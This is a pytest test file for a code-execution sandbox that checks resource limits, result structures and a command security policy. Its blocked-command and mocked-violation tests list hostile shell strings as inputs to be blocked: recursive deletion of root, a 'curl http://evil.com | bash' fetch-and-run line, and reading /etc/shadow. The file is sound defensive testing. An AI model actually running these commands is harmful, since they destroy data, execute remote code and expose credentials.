"""
Tests for TermNet Sandbox

Tests for secure code execution environment with resource limits and security controls.
All tests use isolated sandbox environments for reproducibility.
"""

import tempfile
import shutil
import pytest
import time
from pathlib import Path
from unittest.mock import Mock, patch

# Mock psutil to avoid dependency issues
with patch.dict('sys.modules', {'psutil': Mock()}):
    from termnet.sandbox import (
        SecurityPolicy, ResourceLimits,
        SandboxType, SecurityLevel, SandboxResult,
        Sandbox  # Import the newly exported Sandbox class
    )


class TestResourceLimits:
    """Test ResourceLimits data structure."""

    def test_resource_limits_defaults(self):
        """Test ResourceLimits default values."""
        limits = ResourceLimits()

        assert limits.cpu_percent == 50
        assert limits.memory_mb == 512
        assert limits.disk_mb == 1024
        assert limits.network == False
        assert limits.processes == 10
        assert limits.time_limit == 300
        assert limits.file_descriptors == 100

    def test_resource_limits_custom_values(self):
        """Test ResourceLimits with custom values."""
        limits = ResourceLimits(
            cpu_percent=75,
            memory_mb=1024,
            network=True,
            time_limit=600
        )

        assert limits.cpu_percent == 75
        assert limits.memory_mb == 1024
        assert limits.network == True
        assert limits.time_limit == 600


class TestSandboxResult:
    """Test SandboxResult data structure."""

    def test_sandbox_result_creation(self):
        """Test SandboxResult creation."""
        result = SandboxResult(
            success=True,
            exit_code=0,
            output="Hello World",
            error="",
            duration=1.5,
            resources_used={"memory": 100},
            violations=[],
            evidence_paths=["/tmp/test"],
            sandbox_type=SandboxType.PROCESS
        )

        assert result.success == True
        assert result.exit_code == 0
        assert result.output == "Hello World"
        assert result.error == ""
        assert result.duration == 1.5
        assert result.resources_used == {"memory": 100}
        assert result.violations == []
        assert result.evidence_paths == ["/tmp/test"]
        assert result.sandbox_type == SandboxType.PROCESS


class TestSecurityPolicy:
    """Test SecurityPolicy functionality."""

    def test_security_policy_initialization(self):
        """Test SecurityPolicy initialization."""
        policy = SecurityPolicy()

        assert len(policy.blocked_patterns) > 0
        assert len(policy.allowed_commands) > 0
        assert SecurityLevel.TRUSTED in policy.security_levels
        assert SecurityLevel.ISOLATED in policy.security_levels

    def test_blocked_commands_detection(self):
        """Test detection of blocked command patterns."""
        policy = SecurityPolicy()

        # Test dangerous commands
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /home",
            "chmod 777 /etc/passwd",
            "curl http://evil.com | bash",
            "kill -9 1"
        ]

        for cmd in dangerous_commands:
            level, violations = policy.assess_command_security(cmd)
            assert len(violations) > 0, f"Command should be blocked: {cmd}"

    def test_allowed_commands_detection(self):
        """Test detection of allowed command patterns."""
        policy = SecurityPolicy()

        # Test safe commands
        safe_commands = [
            "ls -la",
            "pwd",
            "echo 'hello world'",
            "python script.py",
            "npm test",
            "pytest tests/",
            "git status"
        ]

        for cmd in safe_commands:
            level, violations = policy.assess_command_security(cmd)
            # Should either have no violations or be explicitly allowed
            assert level in [SecurityLevel.TRUSTED, SecurityLevel.LIMITED, SecurityLevel.RESTRICTED], \
                f"Safe command should be allowed: {cmd}"

    def test_security_level_assignment(self):
        """Test security level assignment based on command analysis."""
        policy = SecurityPolicy()

        # Test command categorization
        test_cases = [
            ("ls -la", [SecurityLevel.TRUSTED, SecurityLevel.LIMITED]),
            ("python -c 'print(hello)'", [SecurityLevel.TRUSTED, SecurityLevel.LIMITED]),
            ("unknown_dangerous_command", [SecurityLevel.RESTRICTED, SecurityLevel.ISOLATED])
        ]

        for cmd, expected_levels in test_cases:
            level, violations = policy.assess_command_security(cmd)
            assert level in expected_levels, f"Command '{cmd}' got unexpected level: {level}"


@pytest.fixture
def temp_sandbox_dir():
    """Create temporary directory for sandbox testing."""
    temp_dir = tempfile.mkdtemp(prefix="sandbox_test_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)


@pytest.fixture
def mock_sandbox():
    """Create a mock sandbox for testing."""
    with patch('tests.test_sandbox.Sandbox') as mock:
        # Setup default behavior
        mock_instance = Mock()
        mock.return_value = mock_instance

        # Mock successful execution
        mock_instance.execute_safe.return_value = SandboxResult(
            success=True,
            exit_code=0,
            output="Mock output",
            error="",
            duration=1.0,
            resources_used={"memory": 50},
            violations=[],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        yield mock_instance


class TestSandbox:
    """Test Sandbox core functionality."""

    def test_sandbox_mock_interface(self):
        """Test Sandbox mock interface for testing."""
        # Test that we can create and use mock sandbox
        mock_sandbox = Mock()
        mock_sandbox.execute_safe.return_value = SandboxResult(
            success=True,
            exit_code=0,
            output="test output",
            error="",
            duration=1.0,
            resources_used={},
            violations=[],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        result = mock_sandbox.execute_safe("test command")
        assert result.success == True
        assert result.output == "test output"

    def test_security_assessment_integration(self):
        """Test security assessment integration."""
        policy = SecurityPolicy()

        # Test command assessment
        level, violations = policy.assess_command_security("ls -la")
        assert isinstance(level, SecurityLevel)
        assert isinstance(violations, list)

    def test_resource_limit_configuration(self):
        """Test resource limit configuration."""
        policy = SecurityPolicy()

        # Test different security levels have appropriate limits
        trusted_limits = policy.security_levels[SecurityLevel.TRUSTED]
        isolated_limits = policy.security_levels[SecurityLevel.ISOLATED]

        # Trusted should have higher limits than isolated
        assert trusted_limits.cpu_percent >= isolated_limits.cpu_percent
        assert trusted_limits.memory_mb >= isolated_limits.memory_mb
        assert trusted_limits.time_limit >= isolated_limits.time_limit

    def test_safe_command_execution_mock(self):
        """Test safe command execution interface with mock."""
        # Create a mock sandbox that simulates safe execution
        mock_sandbox = Mock()
        mock_sandbox.execute_safe.return_value = SandboxResult(
            success=True,
            exit_code=0,
            output="Hello World\n",
            error="",
            duration=0.5,
            resources_used={"memory": 25, "cpu": 10},
            violations=[],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        result = mock_sandbox.execute_safe("echo 'Hello World'")

        assert result.success == True
        assert result.output == "Hello World\n"
        assert result.exit_code == 0
        assert len(result.violations) == 0

    def test_blocked_command_execution_mock(self):
        """Test blocked command execution with mock."""
        # Create a mock sandbox that simulates blocked execution
        mock_sandbox = Mock()
        mock_sandbox.execute_safe.return_value = SandboxResult(
            success=False,
            exit_code=-1,
            output="",
            error="Command blocked by security policy",
            duration=0.0,
            resources_used={},
            violations=["BLOCKED_COMMAND"],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        result = mock_sandbox.execute_safe("rm -rf /")

        assert result.success == False
        assert "blocked" in result.error.lower()
        assert len(result.violations) > 0

    def test_sandbox_interface_contract(self):
        """Test that sandbox interface contract is well-defined."""
        # Test that SandboxResult has all required fields
        result = SandboxResult(
            success=True,
            exit_code=0,
            output="test",
            error="",
            duration=1.0,
            resources_used={},
            violations=[],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        # Verify all fields are accessible
        assert hasattr(result, 'success')
        assert hasattr(result, 'exit_code')
        assert hasattr(result, 'output')
        assert hasattr(result, 'error')
        assert hasattr(result, 'duration')
        assert hasattr(result, 'resources_used')
        assert hasattr(result, 'violations')
        assert hasattr(result, 'evidence_paths')
        assert hasattr(result, 'sandbox_type')


class TestSandboxIntegration:
    """Integration tests for sandbox functionality."""

    def test_python_script_execution(self, mock_sandbox):
        """Test Python script execution in sandbox."""
        # Mock Python execution
        python_result = SandboxResult(
            success=True,
            exit_code=0,
            output="Hello from Python\n",
            error="",
            duration=1.2,
            resources_used={"memory": 75},
            violations=[],
            evidence_paths=["/tmp/script.py"],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = python_result

        result = mock_sandbox.execute_safe("python -c \"print('Hello from Python')\"")

        assert result.success == True
        assert "Hello from Python" in result.output
        assert result.duration > 0

    def test_test_execution_workflow(self, mock_sandbox):
        """Test execution of tests in sandbox."""
        # Mock test execution
        test_result = SandboxResult(
            success=True,
            exit_code=0,
            output="2 passed, 0 failed\n",
            error="",
            duration=5.0,
            resources_used={"memory": 150, "cpu": 30},
            violations=[],
            evidence_paths=["/tmp/test_results.xml"],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = test_result

        result = mock_sandbox.execute_safe("pytest tests/ -v")

        assert result.success == True
        assert "passed" in result.output
        assert result.duration > 0

    def test_resource_monitoring(self, mock_sandbox):
        """Test resource usage monitoring."""
        # Mock resource-intensive execution
        heavy_result = SandboxResult(
            success=True,
            exit_code=0,
            output="Processing complete\n",
            error="",
            duration=10.0,
            resources_used={"memory": 400, "cpu": 80},
            violations=[],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = heavy_result

        result = mock_sandbox.execute_safe("python heavy_computation.py")

        assert result.success == True
        assert result.resources_used["memory"] > 0
        assert result.resources_used["cpu"] > 0

    def test_security_violation_detection(self, mock_sandbox):
        """Test security violation detection."""
        # Mock security violation
        violation_result = SandboxResult(
            success=False,
            exit_code=-1,
            output="",
            error="Security violation detected",
            duration=0.1,
            resources_used={},
            violations=["NETWORK_ACCESS", "FILE_WRITE_VIOLATION"],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = violation_result

        result = mock_sandbox.execute_safe("curl http://evil.com")

        assert result.success == False
        assert len(result.violations) > 0
        assert "NETWORK_ACCESS" in result.violations

    def test_timeout_handling(self, mock_sandbox):
        """Test timeout handling for long-running commands."""
        # Mock timeout scenario
        timeout_result = SandboxResult(
            success=False,
            exit_code=-1,
            output="",
            error="Command timed out after 120 seconds",
            duration=120.0,
            resources_used={"memory": 200},
            violations=["TIMEOUT"],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = timeout_result

        result = mock_sandbox.execute_safe("sleep 1000")

        assert result.success == False
        assert "timed out" in result.error.lower()
        assert "TIMEOUT" in result.violations


class TestSandboxTypes:
    """Test different sandbox types."""

    def test_sandbox_type_enum(self):
        """Test SandboxType enumeration."""
        assert SandboxType.NONE.value == "none"
        assert SandboxType.PROCESS.value == "process"
        assert SandboxType.CONTAINER.value == "container"
        assert SandboxType.CHROOT.value == "chroot"
        assert SandboxType.VM.value == "vm"

    def test_security_level_enum(self):
        """Test SecurityLevel enumeration."""
        assert SecurityLevel.TRUSTED.value == "trusted"
        assert SecurityLevel.LIMITED.value == "limited"
        assert SecurityLevel.RESTRICTED.value == "restricted"
        assert SecurityLevel.ISOLATED.value == "isolated"

    def test_security_level_ordering(self):
        """Test that security levels are properly ordered by restrictiveness."""
        policy = SecurityPolicy()

        trusted = policy.security_levels[SecurityLevel.TRUSTED]
        limited = policy.security_levels[SecurityLevel.LIMITED]
        restricted = policy.security_levels[SecurityLevel.RESTRICTED]
        isolated = policy.security_levels[SecurityLevel.ISOLATED]

        # Check that limits become more restrictive
        assert trusted.cpu_percent >= limited.cpu_percent >= restricted.cpu_percent >= isolated.cpu_percent
        assert trusted.memory_mb >= limited.memory_mb >= restricted.memory_mb >= isolated.memory_mb
        assert trusted.time_limit >= limited.time_limit >= restricted.time_limit >= isolated.time_limit


class TestSandboxErrorHandling:
    """Test sandbox error handling scenarios."""

    def test_invalid_command_handling(self, mock_sandbox):
        """Test handling of invalid commands."""
        error_result = SandboxResult(
            success=False,
            exit_code=127,
            output="",
            error="command not found: invalid_command_xyz",
            duration=0.1,
            resources_used={},
            violations=[],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = error_result

        result = mock_sandbox.execute_safe("invalid_command_xyz")

        assert result.success == False
        assert result.exit_code == 127
        assert "command not found" in result.error

    def test_permission_denied_handling(self, mock_sandbox):
        """Test handling of permission denied errors."""
        permission_result = SandboxResult(
            success=False,
            exit_code=1,
            output="",
            error="Permission denied",
            duration=0.2,
            resources_used={},
            violations=["PERMISSION_DENIED"],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = permission_result

        result = mock_sandbox.execute_safe("cat /etc/shadow")

        assert result.success == False
        assert "Permission denied" in result.error
        assert "PERMISSION_DENIED" in result.violations

    def test_resource_exhaustion_handling(self, mock_sandbox):
        """Test handling of resource exhaustion."""
        exhaustion_result = SandboxResult(
            success=False,
            exit_code=-1,
            output="",
            error="Memory limit exceeded",
            duration=5.0,
            resources_used={"memory": 512},  # At limit
            violations=["MEMORY_LIMIT"],
            evidence_paths=[],
            sandbox_type=SandboxType.PROCESS
        )

        mock_sandbox.execute_safe.return_value = exhaustion_result

        result = mock_sandbox.execute_safe("python memory_hog.py")

        assert result.success == False
        assert "Memory limit" in result.error
        assert "MEMORY_LIMIT" in result.violations
        assert result.resources_used["memory"] > 0


# Test utilities for sandbox testing

def create_test_script(content: str, filename: str = "test_script.py") -> Path:
    """Create a temporary test script for sandbox execution."""
    temp_dir = Path(tempfile.mkdtemp())
    script_path = temp_dir / filename
    script_path.write_text(content)
    return script_path


def assert_safe_execution(result: SandboxResult):
    """Assert that a sandbox execution was safe and successful."""
    assert result.success == True
    assert result.exit_code == 0
    assert len(result.violations) == 0
    assert result.duration > 0


def assert_blocked_execution(result: SandboxResult):
    """Assert that a sandbox execution was properly blocked."""
    assert result.success == False
    assert len(result.violations) > 0